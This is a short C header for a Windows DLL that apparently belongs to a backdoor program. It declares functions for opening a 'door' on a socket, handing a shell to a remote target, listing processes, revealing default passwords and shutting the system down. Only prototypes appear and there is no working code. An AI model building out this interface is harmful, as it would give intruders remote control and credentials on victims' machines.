#ifndef _DLL_H_
#define _DLL_H_
#include <windows.h>

#if BUILDING_DLL
# define DLLIMPORT __declspec (dllexport)
#else /* Not BUILDING_DLL */
# define DLLIMPORT __declspec (dllimport)
#endif /* Not BUILDING_DLL */
//=====================PlusIn Functions==================================
DLLIMPORT DWORD WINAPI start();

int open_door(SOCKET sock);

int show_help(SOCKET target);
int init_door();
int get_shell(SOCKET target);
int shutdown_os(SOCKET target, int flag);
int list_process(SOCKET target);
int get_default_pass(SOCKET target);
char * adjust_cmd(char *in);

int WINAPI WinMain( HINSTANCE hInstance,	    // handle to current instance
					HINSTANCE hPrevInstance,	// handle to previous instance
					LPSTR lpCmdLine,	        // pointer to command line
					int nCmdShow 	            // show state of window
					);
#define G_OPTION_FILE_NAME "appdll.ini"
#endif /* _DLL_H_ */
